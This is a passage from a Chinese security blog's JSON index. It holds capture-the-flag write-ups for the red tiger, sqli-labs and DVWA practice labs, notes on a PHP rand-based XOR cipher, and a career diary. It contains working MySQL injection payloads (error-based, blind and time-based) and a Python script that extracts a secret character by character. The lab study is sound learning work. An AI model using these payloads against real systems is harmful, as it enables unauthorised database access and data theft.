col)，但实际上起到一个重要作用。它添加的一个~让参数不论是什么格式，都不能当成xpath识别，也就让 MySQL 能稳定地抛出错误，让我们稳定地从错误信息里拿到extractvalue第二参数的内容。\n","date":"2022-05-09T17:14:46+08:00","permalink":"https://nnnewb.github.io/blog/p/sqli-labs-training-1/","title":"sqli-labs 实验记录 #1"},{"content":"前言 虽然靶场说不要透露任何 solution 但谷歌搜了下发现早有人透题了\u0026hellip;于是灵活一点，不透 flag 就完了。\n正文 盲注测试 看到id=1先试试id=2，发现返回 0，然后试试id=2 or 1=1，返回1，应该能注入。\n长度测试 本来想 or 跟一个子查询：SELECT (SELECT CHAR_LENGTH(keyword) FROM level4_secret LIMIT 1)\u0026gt;10;，手欠试了下直接or char_length(keyword)\u0026gt;10 发现返回了 1 row，于是省掉了子查询。\n用 or char_length(keyword)\u0026gt;?二分法，从\u0026gt;100开始测直到得到结果。\n按位猜解 用 or ascii(substring(keyword,1,1)) BETWEEN ascii('a') AND ascii('z')测一遍第一个字符是不是小写字母，然后按这个思路二分搜一遍。\n1 2 3 4 5  BETWEENascii(\u0026#39;a\u0026#39;)ANDascii(\u0026#39;z\u0026#39;)BETWEENascii(\u0026#39;a\u0026#39;)ANDascii(\u0026#39;a\u0026#39;)-ascii(\u0026#39;z\u0026#39;)#字母表前一半,97~122BETWEENascii(\u0026#39;a\u0026#39;)-ascii(\u0026#39;z\u0026#39;)andascii(\u0026#39;z\u0026#39;)#字母表后一半BETWEENascii(\u0026#39;A\u0026#39;)ANDascii(\u0026#39;Z\u0026#39;)BETWEENascii(\u0026#39;0\u0026#39;)ANDascii(\u0026#39;9\u0026#39;)  但如果不是字母或数字，是 UNICODE 的话就麻烦了。可以结合 hex 函数或者别的方式编码一下再猜，我没找到能把 UNICODE 转数字就像 ascii 一样的函数。\n手工测肯定是不行的，没那个闲工夫。写个脚本暴力跑一遍即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  import time import requests import string length = 0 # 自己根据上面的方法找出 keyword 长度 secret = \u0026#39;\u0026#39; for pos in range(1, length): for c in string.printable: time.sleep(0.1) print(f\u0026#39;{pos}: test {c}\u0026#39;) resp = requests.get(\u0026#39;http://redtiger.labs.overthewire.org/level4.php\u0026#39;, { \u0026#39;id\u0026#39;: f\u0026#39;2 or substring(keyword,{pos},1)=\\\u0026#39;{c}\\\u0026#39;\u0026#39; }, cookies={ # **removed** }) if resp.text.find(\u0026#39;Query returned 1 rows.\u0026#39;) \u0026gt;= 0: print(f\u0026#39;{pos}: {repr(c)}correct\u0026#39;) secret += c break print(f\u0026#39;secret is {secret}\u0026#39;)   注意 cookies，其他没有特别的地方。这个脚本略暴力，可以优化成 find_in_set 二分搜索，可以显著降低请求次数。\n总结 把 flag 贴进去就过了，没什么难的。原本想 sqlmap 能不能解决，但 sqlmap 还用不太熟练，不确定能不能盲注解出 keyword 的值。之后会在 DVWA 上研究下 sqlmap 猜解指定的字段要怎么猜。\n","date":"2022-05-06T15:32:08+08:00","permalink":"https://nnnewb.github.io/blog/p/redtiger-lab-training-note-2022-05-06/","title":"red tiger 打靶日志"},{"content":"前言 打 red tiger 靶场的时候遇到一个有点怪的 trick ，慢慢道来。\nlevel 3 里会拿到一个 php 文件，里面有加密/解密算法。算法本身不算怪，就是个简单的 xor ，比较怪的是秘钥流的生成算法，还有涉及到的密码学内容。\n正文 解密算法 先看解密的算法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  function decrypt ($str) { srand(3284724); if(preg_match(\u0026#39;%^[a-zA-Z0-9/+]*={0,2}$%\u0026#39;,$str)) { $str = base64_decode($str); if ($str != \u0026#34;\u0026#34; \u0026amp;\u0026amp; $str != null \u0026amp;\u0026amp; $str != false) { // 前面都是参数验证，下面才是真正的解密  $decStr = \u0026#34;\u0026#34;; // 把字符串按3个字符一组分割  // 比如 123456789 分割成数组 123,456,789  // 密文每3位表示一个明文字符  for ($i=0; $i \u0026lt; strlen($str); $i+=3) { $array[$i/3] = substr($str,$i,3); } // 有趣的地方：伪随机数 xor 密文完成解密。  foreach($array as $s) { $a = $s ^ rand(0, 255); $decStr .= chr($a); } return $decStr; } return false; } return false; }   我加了点注释。接着说说为什么有趣。\n伪随机数  口胡警告。\n 首先显而易见，接触过随机数函数都应该知道什么叫 伪随机 ，基本伪随机数函数的文档都会给个密码学相关的警告，一般说的是这个函数不能生成在密码学而言安全的随机数。php 的 rand 函数也有个这样的警告。\n This function does not generate cryptographically secure values, and should not be used for cryptographic purposes. If you need a cryptographically secure value, consider using random_int(), random_bytes(), or openssl_random_pseudo_bytes() instead.\n 这就涉及所谓 伪随机 的本质了。伪随机数之所以是 伪 的，是因为其内部实现是一个让生成数字尽可能平均地分布到值域里的算法，如果给定输入则经过这个算法会得到固定的输出序列。对于不够强的伪随机数算法，得到一定数量的随机值后可以猜出随机种子或未来会出现的某个随机值的话，显然是不安全的。比如用作秘钥生成或者 nonce 之类的场景。\n不过提到“不够强”，自然也有够强的伪随机数算法。也就是密码学安全的伪随机数生成器 cryptographically-secure pseudorandom number generator, CSPRNG or CPRNG。参考 wiki 定义如下。\n 除了满足统计学伪随机性外，还需满足“不能通过给定的随机序列的一部分而以显著大于 1/2 的概率在多项式时间内演算出比特序列的任何其他部分。”\n 真的不是很懂所以就不瞎扯了，继续说为啥有意思。rand 函数产生的是一个 随机序列 ，然后这个序列被用来加密和解密，而且这个随机序列理论上来说是无限长的，而前述解密算法利用随机序列作为秘钥流解密密文。这就让人想到了另一个有意思的事情，一次一密。\n一次一密 密码学入门教材应该有说过，一次一密是无条件安全的，统计学攻击对一次一密无效。但一次一密的难点在于如何传递或约定秘钥流，毕竟密文可以无条件安全，秘钥传递不行。如果是约定一个很长的秘钥流重复使用，那一次一密就退化成了MTP，获取到足够数量的密文还是可以被攻击。\n上面的解密算法有趣的地方就在于使用了 rand 产生的随机数序列作为秘钥，如果再稍微改进一下，$_SESSION里记录rand的步数，完全可以实现伪一次一密，每次返回给浏览器的密文都不相同，凭密文也找不出规律。不过这样靶场难度就太高了=。=对我来说。\n对上面给出的解密算法只能算是 MTP，虽然秘钥长度是无限的，但加密总是在用前 N 个数当秘钥。如果已知明文再多一点的话即使不拿到这个加密/解密算法也可以简单拼凑下密文发起攻击（因为 xor 是简单的替代密码，没有置换）。\n随机数平台/版本差异 回到题目本身，这个解密算法其实不是那么可移植。我验证了一下，在 Windows 下 php 5.4 rand 产生的序列和 Linux 下 php 5.6 rand 产生的序列是不同的。直接把上面的解密算法在 Windows 下跑无法正常解密。\n同时，php 5 的随机数算法和 php 7/8 的随机数算法又不一样，产生的序列不同。升级 php 版本也会导致原先加密的内容无法解密。\n最终用在线沙盒解决了问题。\n总结 代码跑不起来注意下平台和版本差异，我觉得干过几年自己搭过项目环境都应该知道怎么回事吧\u0026hellip;\u0026hellip;\n其他就是闲扯淡没什么好总结的，密码学的东西只看了点基础的，写不出证明也没怎么接触过什么正经实现。非要说的话就是比啥也不懂好一点。\n","date":"2022-05-06T11:06:52+08:00","permalink":"https://nnnewb.github.io/blog/p/a-trick-that-was-a-bit-off/","title":"一个有点离谱的trick"},{"content":"前言 靶场地址：http://redtiger.labs.overthewire.org/\n按照靶场约定，不会直接给任何解。仅记录在这个靶场练习的时候学到的东西。\nerror based SQL injection red tiger 靶场都是盲注，但还是要提一嘴。学到多少算多少。error based SQL injection 顾名思义要靠错误，所以前端有错误消息回显才有用。但盲注的时候依然能用到一些相关技巧。\n当前表列数量 group by 法 1 2 3  select*fromusersgroupby5;#SQL错误[1054][42S22]:Unknowncolumn\u0026#39;5\u0026#39;in\u0026#39;group statement\u0026#39;#5是列号，不存在列的时候报上面的错，需要自己枚举1,2,3,4,5直到确认。因为一次测一个真/假所以盲注的时候也能用。  order by 法 1 2 3  select*fromusersorderby1,2,3,4,5,6,7,8,9,10,11,12,13,14,15;#SQL错误[1054][42S22]:Unknowncolumn\u0026#39;3\u0026#39;in\u0026#39;order clause\u0026#39;#3是列号，orderby法一次可以枚举很多列，大多时候可以一次拿到当前表的列数。不过盲注的时候不行。可以用来缩小范围。  子查询法 1 2 3  select*fromuserswhere(SELECT*fromusers)=(1,2);#SQL错误[1241][21000]:Operandshouldcontain2column(s)#这个方法直接爆出有几个列，但要求知道表名  union 法 1 2 3 4  select*fromusersunionallselect1,2,3,NULL,NULL,NULL,NULL,NULL,NULL#(typesofcolumnsmustmatchorbeofderivedtypesorNULL)#SQL错误[1222][21000]:TheusedSELECTstatementshaveadifferentnumberofcolumns#利用union查询列数量必须相等来确定左侧查询的列数量，如果左侧是select*的话那union查询枚举的列数量就是表里列的数量  获取列名 union+notnull 1 2 3  select*fromuserswhere(1,2,3)=(select*fromusersunionallselect1%0,2,3);#Error:Column\u0026#39;id\u0026#39;cannotbenull#实测发现在MySQL5.7中不好使了，会出现SQL错误[1242][21000]:Subqueryreturnsmorethan1row  insert 1 2 3  insertintousers(id,username,passwd)values(if(1=1,NULL,\u0026#39;1\u0026#39;),\u0026#39;2\u0026#39;,\u0026#39;3\u0026#39;)#Error:Column\u0026#39;id\u0026#39;cannotbenull#要先得到列名，。而且实测MySQL5.7里对主键+自增+非空，即使直接insertnull也会成功。  join 1 2 3  select*from(select*fromusersJOINusersa)b;#Error:Duplicatecolumnname\u0026#39;id\u0026#39;#同样失效了。MySQL5.7下会返回重复的列名。  获取值 count floor(rand(0)*2) group by 1 2 3  selectCOUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))xfromusersGROUPBYx;#SQL错误[1062][23000]:Duplicateentry\u0026#39;5.7.331\u0026#39;forkey\u0026#39;\u0026lt;group_key\u0026gt;\u0026#39;#需要注意的是COUNT(*)不能少   Works because mysql insides executes this query by making two queries: add count of x into temp table and if error (x value does not exist) then insert x value (second time x calculation) into table\n BIGINT UNSIGNED 1 2 3  select!(select*from(selectversion())x)-~0;#在MySQL5.7不起效。#BIGINTUNSIGNEDvalueisoutofrangein\u0026#39;((not((select `x`.`version()` from (select version() AS `version()`) `x`))) - ~(0))\u0026#39;  不过还存在一个能爆出列名的 payload。\n1 2 3 4  select2*if((select*fromtestlimit1)\u0026gt;(select*fromtestlimit1),18446744073709551610,18446744073709551610);#注意18446744073709551610就是~0#SQL错误[1690][22001]:Datatruncation:BIGINTUNSIGNEDvalueisoutofrangein\u0026#39;(2 * if(((select `test`.`test`.`id`,`test`.`test`.`name` from `test`.`test` limit 1) \u0026gt; (select `test`.`test`.`id`,`test`.`test`.`name` from `test`.`test` limit 1)),18446744073709551610,18446744073709551610))\u0026#39;#这里会把select*展开成具体列名  updatexml 1 2  selectupdatexml(1,concat(\u0026#39;~\u0026#39;,version()),1);#SQL错误[1105][HY000]:XPATHsyntaxerror:\u0026#39;~5.7.33\u0026#39;  extractvalue 1 2  selectextractvalue(1,concat(\u0026#39;~\u0026#39;,version()));#SQL错误[1105][HY000]:XPATHsyntaxerror:\u0026#39;~5.7.33\u0026#39;  ST_LongFromGeoHash 1 2 3  selectST_LongFromGeoHash(version());#MySQL\u0026gt;=5.7.5#SQL错误[1411][HY000]:Incorrectgeohashvalue:\u0026#39;5.7.33\u0026#39;forfunctionST_LONGFROMGEOHASH  blind SQL injection 两个技巧。\nif/substring/ascii/char 灵活运用 if、substring、ascii、char 这些函数。\n1  SELECT*FROMtestWHEREid=0ORIF(FIND_IN_SET(substring(version(),1,1),\u0026#39;0,1,2,3,4,5\u0026#39;),TRUE,FALSE);  ascii和char两个函数主要是解决不能注入字符串之类的问题。\n1  SELECT*FROMtestWHEREid=0ORascii(substring(version(),1,1))IN(48,49,50,51,52,53);  这样就能完全避免注入的SQL里包含'，对过滤 '的 WAF 大概会有用。\n此外其他的返回布尔值的函数多少在合适的地方还是能一战的吧。\norder by 1  SELECT*FROMtestORDERBY(id*IF(ASCII(substring(VERSION(),1,1))=53,1,-1));  注入点在 order by 子句的时候比较有用。\nfind_in_set 这个就是纯 trick 了。用 find_in_set 可以一次判断更大的范围，减少请求次数。比如原本测试字符串一位就要跑字母表26个字母，算上大小写直接翻倍。find_in_set可以用的话就能实现二分法搜索，时间复杂度骤降。\nTime based SQL injection 也叫 double blind SQL injection， 双盲指的是就连SQL执行结果都看不到。不管传什么都返回完全相同的页面。这种情况只能靠请求时间来判断了。\nsleep 1  selectif(version()like\u0026#39;5%\u0026#39;,sleep(10),false);  不必多解释了吧。\nbenchmark 1  selectbenchmark(10000000,md5(now()));  这种做法叫 heavy queries，就是给MySQL一个压力很大的查询，让MySQL花更长时间执行。除了 benchmark 之外还可以用 cross join ，求两个大表的笛卡尔积。cross join 时算法类似下面这样：\n1 2 3 4 5  for r1 := range table1 { for r2 := range table2 { results = append(results, pair(r1,r2)) } }   计算量等于两个表行数的积。不过前提是要知道表名，最少知道自己的表名，起码还能 JOIN 自己。如果数据量太少的话这个方法产生的返回时间差不够明显，就不能用了。\n参考  MySQL 5.7 Manual - JSON function reference phonexicum.github.io SQLi  思考 red tiger 的 level 1 和 level 2 真的很简单。选择正确的位置注入就能直接 pass，不需要考虑 bypass WAF，没有 trick。\nlevel 3 开始就比较狗了，提示 try to get an error，但这句话不是让你往 error based SQL injection 的方向想，我就给带歪了，还想着怎么制造个能回显的注入 payload ，实际上根本不是这个意思。正确的方向是 制造一个 PHP的错误，解密 usr 这个参数。\n具体就不说了，总之制造 PHP 的错误也需要动 usr ，我给的关键词是 type error，提示很明显了。\n总结 以上，玩得开心。\n","date":"2022-05-06T09:12:42+08:00","permalink":"https://nnnewb.github.io/blog/p/redtiger-lab-training-notes/","title":"redtiger靶场训练笔记"},{"content":"主要是方向性的一些记录和一些想法。\n大体方向 清单 只列出初步了解到的。\n 二进制安全  反病毒 反破解/软件保护   web安全  蓝队（防御，监测，反制） 红队（渗透突防）   漏洞挖掘  二进制、内核 web   安全开发  扫描器、防火墙、流量监测\u0026hellip;\u0026hellip;安全软件开发 代码审计   安全管理  可选方向 研发工作做得比较多，个人知识面在广不在深，考虑代码审计是比较容易上手的。安全开发方向还欠缺很多安全相关的专业知识，但补一补课还有机会，应该吧。\n安全管理了解很浅，转型会很难，而且刚转的话待遇大概没开发好，预计是这样。\n二进制相关方向很难，需要极大精力投入。自学了x86汇编并做了一点简单的实践（52pojie的新年活动CTF，逆向）发现这块真的需要很多知识和经验积累而且很枯燥，有非常多平台相关的 trick。只能说非常难，非常吃经验和知识积累。但总体来说，二进制安全这块的基础知识更新迭代是比较慢的，有非常重的历史包袱。学习曲线应该是入门难，入门后保持学习的压力就会比较轻了。\nWeb是个有点过于概括的大方向，基于我目前的了解是感觉囊括了一般Web开发中应用到基础设施在内的一切内容，从前端到后端应用、后端基础设施（web服务器、代理、缓存、数据库、消息队列、容器引擎、容器编排系统、虚拟化等等），非常综合性的方向。但这块目前了解到的很少，从先知社区和其他平台了解到的主要还是两类：攻防和漏洞挖掘。\n这块不能说零基础，但真的缺乏积累，不过基础岗应该很快就能达到要求，大概。\n总结一下下面的方向都还可能：\n 安全开发 - 代码审计 漏洞挖掘 - Web Web 安全 - 攻防  路线 前期方向比较接近，主要是补安全领域的基础知识。\n 取得 CISP 证书（初步了解发现要求强制培训和工作经验，机构报价很贵，8k 左右的成本，需要考虑下）。 摸清 OWASP Top 10 ，了解当前主要安全威胁来源。可能的话找靶场具体了解。 收集一些安全情报来源，CNVD、CVE。搞清楚去哪儿找安全情报。 收集一些安全领域的工具，主要覆盖已经了解的 Web 安全领域细分方向，摸清基本使用方法和原理。 补必要的编程语言知识，Java、PHP。给代码审计打基础。 培养一点基本的安全意识，靶场实践里积累一点方法论。  综合来说，这个阶段主要是在迷雾里找个方向，不一定正确但要先走起来。路在脚下。\n求职计划 初级~中级，安全领域技术类岗位，个人倾向于攻防和挖洞，因为比较酷也是兴趣所在的方向。但安全领域的研发也可以接受，看能得到什么样的岗位。做安全的公司和其他领域比起来还是少得可怜的，竞争可能会很激烈。个人推测是人才缺口可能在安全+研发这块，攻防挖洞不能说饱和但应该不会特别缺人吧？就是瞎猜下。门槛应该都不会太低，开发是条狗都能干点基础的活，几年干下来我已经见识到没水平的开发是什么样子了。安全领域虽然不熟悉，但猜测安全没点脑子应该是干不动的（也不绝对吧\u0026hellip;傻x哪儿都有）。\n文末碎碎念 想要换工作一个理所当然的原因就是对现在的干的活不满意。不满意的理由有很多，概括起来就是委屈和没钱。\n工作快5年下来，换了三四个老板，多少是看清了一点现实，期望值腰斩再腰斩。曾经我以为有钱有闲满足一个就行，现在发现好像和我预期的不太一样。\n开始工作的前两年我就差不多意识到了，我不是那种自制力很强的人，三分钟热度说的就是我。不过兴趣能提供的驱动力持续时间多少还是比三分钟长的，只要开始的时候顺利，没有硬门槛或者太大的挫折给弄委屈了，基本还是能达到入门的。然后下一个阶段就是恐慌焦虑，后悔折腾的事情无法变现没有意义，继续的成本太高等等。开始工作前我还写过本同人小说来着，发在刺猬猫上，40多w字，现在想起来还有点惊奇那时候怎么坚持每天在word里水上一个小时两个小时的。至于后来嘛，发生了一些事，和家里闹翻了，出来找工作，总之是阴差阳错吧，我又是早早学过 C/C++/Java 的，基础不错，运气好碰到家愿意收的公司，就开始干码农这行了。\n转行安全是现在的想法，很难说是因为看了几篇大佬的博客产生的三分钟热度还是长久以来的梦想什么的。所以现实一点，转行的目的是抬高收入的天花板，减轻学历歧视的负担。换句话说，就是找机会多赚点钱，在现有条件下拿高那么点点的工资。\n不管怎么说转方向都是个很重大的事情，过去的后端研发经验价值要缩水不少但不会归零，想转回来也会有机会但并不会容易，损失最大的就是时间。\n真的是一件很需要勇气去做的事，而且我也真的不能肯定会达成目的。\n路在脚下，且行且珍惜吧。\n","date":"2022-05-05T11:29:51+08:00","permalink":"https://nnnewb.github.io/blog/p/diary-2022-05-05/","title":"2022年5月5日 未来规划"},{"content":"前言 DVWA最后一题了。\n原理 没有原理。\n The attacks in this section are designed to help you learn about how JavaScript is used in the browser and how it can be manipulated. The attacks could be carried out by just analysing network traffic, but that isn\u0026rsquo;t the point and it would also probably be a lot harder.\n 本质是 bypass 各种前端的检查或加密、签名。大概在搞爬虫的时候会很有用。\n解题 Low：收集信息 直接点击 Submit 看看。\n修改为 success 再点击 Submit 看看。\n注意到两件事：\n phrase 是明文。 token 一直不变。  所以初步怀疑题意是逆向出 token 的算法，让 phrase 和 token 匹配以通过检查。后来看帮助确实如此。\n提取出前端相关js。\n1 2 3 4 5 6  function generate_token() { var phrase = document.getElementById(\u0026#34;phrase\u0026#34;).value; document.getElementById(\u0026#34;token\u0026#34;).value = md5(rot13(phrase)); } generate_token();   这个脚本运行后设置token的值，运行肯定是比人看到页面早的。\nLow：解题 输入框填好 success，然后直接在开发者工具控制台里跑一次 generate_token() 就行了。\nMedium：收集信息 UI上和Low难度没区别。直接看 js 变化。\n1 2 3 4 5 6 7 8 9 10 11  function do_something(e) { for (var t = \u0026#34;\u0026#34;, n = e.length - 1; n \u0026gt;= 0; n--) t += e[n]; return t } setTimeout(function() { do_elsesomething(\u0026#34;XX\u0026#34;) }, 300); function do_elsesomething(e) { document.getElementById(\u0026#34;token\u0026#34;).value = do_something(e + document.getElementById(\u0026#34;phrase\u0026#34;).value + \u0026#34;XX\u0026#34;) }   字符串逆转，然后前后加上了 XX。\nMedium：解题 填好success后，直接在控制台运行一次 do_elsesomething(\u0026quot;XX\u0026quot;) 就完事了。\nHigh: 收集信息 UI还是不变，看脚本，发现做了混淆。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  var a = [\u0026#39;fromCharCode\u0026#39;, \u0026#39;toString\u0026#39;, \u0026#39;replace\u0026#39;, \u0026#39;BeJ\u0026#39;, \u0026#39;\\x5cw+\u0026#39;, \u0026#39;Lyg\u0026#39;, \u0026#39;SuR\u0026#39;, \u0026#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R\u0026amp;\u0026amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S\u0026amp;\u0026amp;1c\\x202d===\\x271n\\x27\u0026amp;\u0026amp;2d.2Q\u0026amp;\u0026amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q\u0026amp;\u0026amp;1c\\x202g===\\x271n\\x27\u0026amp;\u0026amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27\u0026amp;\u0026amp;2l.3P;q\\x201y=!Y.3H\u0026amp;\u0026amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y\u0026amp;\u0026amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27\u0026amp;\u0026amp;1x.1w\u0026amp;\u0026amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i\u0026lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i\u0026lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y\u0026amp;\u0026amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M\u0026lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M\u0026lt;W\u0026amp;\u0026amp;i\u0026lt;1k;++M){l[i\u0026gt;\u0026gt;2]|=s[M]\u0026lt;\u0026lt;U[i++\u0026amp;3]}}z{1g(i=k.1A;M\u0026lt;W\u0026amp;\u0026amp;i\u0026lt;1k;++M){r=s.1Q(M);p(r\u0026lt;R){l[i\u0026gt;\u0026gt;2]|=r\u0026lt;\u0026lt;U[i++\u0026amp;3]}z\\x20p(r\u0026lt;2v){l[i\u0026gt;\u0026gt;2]|=(2t|(r\u0026gt;\u0026gt;6))\u0026lt;\u0026lt;U[i++\u0026amp;3];l[i\u0026gt;\u0026gt;2]|=(R|(r\u0026amp;V))\u0026lt;\u0026lt;U[i++\u0026amp;3]}z\\x20p(r\u0026lt;2A||r\u0026gt;=2E){l[i\u0026gt;\u0026gt;2]|=(2D|(r\u0026gt;\u0026gt;12))\u0026lt;\u0026lt;U[i++\u0026amp;3];l[i\u0026gt;\u0026gt;2]|=(R|((r\u0026gt;\u0026gt;6)\u0026amp;V))\u0026lt;\u0026lt;U[i++\u0026amp;3];l[i\u0026gt;\u0026gt;2]|=(R|(r\u0026amp;V))\u0026lt;\u0026lt;U[i++\u0026amp;3]}z{r=2C+(((r\u0026amp;23)\u0026lt;\u0026lt;10)|(s.1Q(++M)\u0026amp;23));l[i\u0026gt;\u0026gt;2]|=(2X|(r\u0026gt;\u0026gt;18))\u0026lt;\u0026lt;U[i++\u0026amp;3];l[i\u0026gt;\u0026gt;2]|=(R|((r\u0026gt;\u0026gt;12)\u0026amp;V))\u0026lt;\u0026lt;U[i++\u0026amp;3];l[i\u0026gt;\u0026gt;2]|=(R|((r\u0026gt;\u0026gt;6)\u0026amp;V))\u0026lt;\u0026lt;U[i++\u0026amp;3];l[i\u0026gt;\u0026gt;2]|=(R|(r\u0026amp;V))\u0026lt;\u0026lt;U[i++\u0026amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i\u0026gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L\u0026gt;4r){k.2i+=k.L/2H\u0026lt;\u0026lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i\u0026gt;\u0026gt;2]|=2w[i\u0026amp;3];k.1C=l[16];p(i\u0026gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i\u0026lt;\u0026lt;3|k.L\u0026gt;\u0026gt;\u0026gt;29;l[15]=k.L\u0026lt;\u0026lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j\u0026lt;1k;++j){v=l[j-15];1a=((v\u0026gt;\u0026gt;\u0026gt;7)|(v\u0026lt;\u0026lt;25))^((v\u0026gt;\u0026gt;\u0026gt;18)|(v\u0026lt;\u0026lt;14))^(v\u0026gt;\u0026gt;\u0026gt;3);v=l[j-2];1b=((v\u0026gt;\u0026gt;\u0026gt;17)|(v\u0026lt;\u0026lt;15))^((v\u0026gt;\u0026gt;\u0026gt;19)|(v\u0026lt;\u0026lt;13))^(v\u0026gt;\u0026gt;\u0026gt;10);l[j]=l[j-16]+1a+l[j-7]+1b\u0026lt;\u0026lt;0}1D=b\u0026amp;c;1g(j=0;j\u0026lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o\u0026lt;\u0026lt;0;d=v+4p\u0026lt;\u0026lt;0}z{1B=4v;v=l[0]-4w;h=v-4G\u0026lt;\u0026lt;0;d=v+4D\u0026lt;\u0026lt;0}k.2j=1O}z{1a=((a\u0026gt;\u0026gt;\u0026gt;2)|(a\u0026lt;\u0026lt;30))^((a\u0026gt;\u0026gt;\u0026gt;13)|(a\u0026lt;\u0026lt;19))^((a\u0026gt;\u0026gt;\u0026gt;22)|(a\u0026lt;\u0026lt;10));1b=((e\u0026gt;\u0026gt;\u0026gt;6)|(e\u0026lt;\u0026lt;26))^((e\u0026gt;\u0026gt;\u0026gt;11)|(e\u0026lt;\u0026lt;21))^((e\u0026gt;\u0026gt;\u0026gt;25)|(e\u0026lt;\u0026lt;7));1B=a\u0026amp;b;1j=1B^(a\u0026amp;c)^1D;1h=(e\u0026amp;f)^(~e\u0026amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v\u0026lt;\u0026lt;0;d=v+1f\u0026lt;\u0026lt;0}1a=((d\u0026gt;\u0026gt;\u0026gt;2)|(d\u0026lt;\u0026lt;30))^((d\u0026gt;\u0026gt;\u0026gt;13)|(d\u0026lt;\u0026lt;19))^((d\u0026gt;\u0026gt;\u0026gt;22)|(d\u0026lt;\u0026lt;10));1b=((h\u0026gt;\u0026gt;\u0026gt;6)|(h\u0026lt;\u0026lt;26))^((h\u0026gt;\u0026gt;\u0026gt;11)|(